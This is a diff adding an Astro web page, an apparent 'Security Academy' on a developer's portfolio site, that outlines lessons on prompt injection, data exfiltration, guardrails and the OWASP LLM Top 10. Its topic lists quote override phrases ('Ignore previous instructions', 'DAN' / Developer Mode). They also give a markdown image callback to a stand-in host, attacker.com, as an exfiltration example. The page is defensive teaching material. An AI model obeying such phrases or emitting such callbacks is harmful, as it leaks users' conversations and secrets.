@@ -1,0 +1,164 @@
+---
+import BaseLayout from '../layouts/BaseLayout.astro';
+import { site } from '../data/site';
+
+const modules = [
+  {
+    id: 'prompt-injection',
+    title: 'Prompt Injection & Jailbreaks',
+    level: 'Beginner',
+    readTime: '4 min',
+    icon: '🛡️',
+    summary: 'Understand how adversaries bypass system instructions through direct overrides, roleplay attacks, and delimiter manipulation.',
+    keyTakeaway: 'Always isolate untrusted user input using XML/tag delimiters and never trust raw user strings in system prompts.',
+    topics: [
+      'Direct instruction override ("Ignore previous instructions")',
+      'Adversarial persona adoption ("DAN" / Developer Mode)',
+      'Delimiter hijacking and escaping',
+      'Indirect prompt injection via external data sources',
+    ],
+  },
+  {
+    id: 'data-exfiltration',
+    title: 'Data Exfiltration & Markdown Embeds',
+    level: 'Intermediate',
+    readTime: '5 min',
+    icon: '🔍',
+    summary: 'How attackers trick LLMs into rendering external image tags and tracking pixels to exfiltrate private conversation history or system secrets.',
+    keyTakeaway: 'Strictly prohibit arbitrary markdown images (![...](...)) and validate all external URLs in model output.',
+    topics: [
+      'Markdown image callback exploits (![img](https://attacker.com?leak=...))',
+      'Hyperlink masquerading and phishing links',
+      'System prompt extraction techniques',
+      'Mitigation with strict Content Security Policy (CSP)',
+    ],
+  },
+  {
+    id: 'defensive-guardrails',
+    title: 'Multi-Tier Guardrails & Output Filtering',
+    level: 'Intermediate',
+    readTime: '6 min',
+    icon: '⚡',
+    summary: 'Design defense-in-depth architectures with pre-inference input validation, system prompt hardening, and post-inference output verification.',
+    keyTakeaway: 'A single layer is never enough. Use input regex/heuristic filters, hardened system instructions, and streaming output scanners.',
+    topics: [
+      '8 Critical System Prompt Security Rules',
+      'Heuristic & regex-based input guardrails',
+      'Streaming TransformStream output filtering in Cloudflare Workers',
+      'Deterministic fallback responses on violation detection',
+    ],
+  },
+  {
+    id: 'owasp-llm-top-10',
+    title: 'OWASP Top 10 for LLM Applications',
+    level: 'Advanced',
+    readTime: '7 min',
+    icon: '🏆',
+    summary: 'A curated overview of the industry-standard OWASP Top 10 vulnerabilities in modern AI applications and APIs.',
+    keyTakeaway: 'Treat LLMs as untrusted third-party agents; never grant them unchecked write/execute access to databases or shell environments.',
+    topics: [
+      'LLM01: Prompt Injection',
+      'LLM02: Sensitive Information Disclosure',
+      'LLM03: Supply Chain Vulnerabilities',
+      'LLM06: Excessive Agency and Autonomous Tool Execution',
+    ],
+  },
+];
+---
+
+<BaseLayout
+  title={`Security Academy - ${site.name}`}
+  description="Byte-sized, practical lessons on AI security, prompt injection defense, and application security."
+>
+  <header class="max-w-3xl">
+    <div class="inline-flex items-center gap-2 rounded-full border border-[var(--border)] bg-[var(--surface)] px-3 py-1 text-xs font-semibold text-[var(--accent)]">
+      <span>🔒</span> Security & AI Engineering
+    </div>
+    <h1 class="mt-4 text-4xl font-bold tracking-tight sm:text-5xl">Security Academy</h1>
+    <p class="mt-4 text-lg text-[var(--muted)]">
+      Byte-sized, battle-tested lessons on AI AppSec, prompt injection defenses, LLM guardrails, and secure system design.
+    </p>
+  </header>
+
+  <!-- Interactive Modules Grid -->
+  <section class="mt-12 grid gap-6 md:grid-cols-2">
+    {modules.map((mod) => (
+      <article class="flex flex-col justify-between rounded-xl border border-[var(--border)] bg-[var(--surface)] p-6 transition-all hover:border-[var(--accent)] hover:shadow-lg">
+        <div>
+          <div class="flex items-center justify-between">
+            <span class="text-3xl">{mod.icon}</span>
+            <div class="flex items-center gap-2">
+              <span class="rounded-full bg-[var(--surface-muted)] px-2.5 py-1 text-xs font-medium text-[var(--muted)]">{mod.readTime}</span>
+              <span class="rounded-full bg-[var(--accent)]/10 px-2.5 py-1 text-xs font-semibold text-[var(--accent)]">{mod.level}</span>
+            </div>
+          </div>
+
+          <h2 class="mt-4 text-xl font-bold text-[var(--text)]">{mod.title}</h2>
+          <p class="mt-2 text-sm leading-relaxed text-[var(--muted)]">{mod.summary}</p>
+
+          <div class="mt-4">
+            <p class="text-xs font-semibold uppercase tracking-wider text-[var(--accent)]">Key Concepts</p>
+            <ul class="mt-2 space-y-1 text-xs text-[var(--muted)]">
+              {mod.topics.map((t) => (
+                <li class="flex items-start gap-1.5">
+                  <span class="text-[var(--accent)]">•</span>
+                  <span>{t}</span>
+                </li>
+              ))}
+            </ul>
+          </div>
+        </div>
+
+        <div class="mt-6 border-t border-[var(--border)] pt-4">
+          <div class="rounded-lg bg-[var(--surface-muted)] p-3 text-xs text-[var(--muted)]">
+            <strong class="text-[var(--text)]">💡 Rule of Thumb:</strong> {mod.keyTakeaway}
+          </div>
+        </div>
+      </article>
+    ))}
+  </section>
+
+  <!-- Interactive Security Sandbox / Checklist -->
+  <section class="mt-14 rounded-2xl border border-[var(--border)] bg-[var(--surface)] p-6 sm:p-8">
+    <div class="max-w-3xl">
+      <h2 class="text-2xl font-bold text-[var(--text)]">🎯 AI Security Checklist</h2>
+      <p class="mt-2 text-sm text-[var(--muted)]">
+        Essential security controls implemented in this portfolio&apos;s production AI assistant:
+      </p>
+
+      <div class="mt-6 grid gap-3 sm:grid-cols-2">
+        <label class="flex items-center gap-3 rounded-lg border border-[var(--border)] bg-[var(--surface-muted)] p-3 text-sm cursor-pointer">
+          <input type="checkbox" checked disabled class="accent-[var(--accent)] h-4 w-4 rounded" />
+          <span>Strict XML input tagging (<code class="text-xs font-mono">&lt;user_input&gt;</code>)</span>
+        </label>
+        <label class="flex items-center gap-3 rounded-lg border border-[var(--border)] bg-[var(--surface-muted)] p-3 text-sm cursor-pointer">
+          <input type="checkbox" checked disabled class="accent-[var(--accent)] h-4 w-4 rounded" />
+          <span>8 Core System Prompt Constraints</span>
+        </label>
+        <label class="flex items-center gap-3 rounded-lg border border-[var(--border)] bg-[var(--surface-muted)] p-3 text-sm cursor-pointer">
+          <input type="checkbox" checked disabled class="accent-[var(--accent)] h-4 w-4 rounded" />
+          <span>Pre-inference Prompt Injection Scanner</span>
+        </label>
+        <label class="flex items-center gap-3 rounded-lg border border-[var(--border)] bg-[var(--surface-muted)] p-3 text-sm cursor-pointer">
+          <input type="checkbox" checked disabled class="accent-[var(--accent)] h-4 w-4 rounded" />
+          <span>Streaming SSE Output Leak Redaction</span>
+        </label>
+      </div>
+
+      <div class="mt-6 flex flex-wrap items-center gap-4">
+        <a
+          href="/contact"
+          class="inline-flex items-center justify-center rounded-lg bg-[var(--accent)] px-5 py-2.5 text-sm font-semibold text-white shadow-sm hover:opacity-90"
+        >
+          Discuss AI Security Collaboration
+        </a>
+        <a
+          href="/blog"
+          class="inline-flex items-center justify-center rounded-lg border border-[var(--border)] bg-[var(--surface)] px-5 py-2.5 text-sm font-semibold text-[var(--text)] hover:bg-[var(--surface-muted)]"
+        >
+          Read Engineering Articles &rarr;
+        </a>
+      </div>
+    </div>
+  </section>
+</BaseLayout>
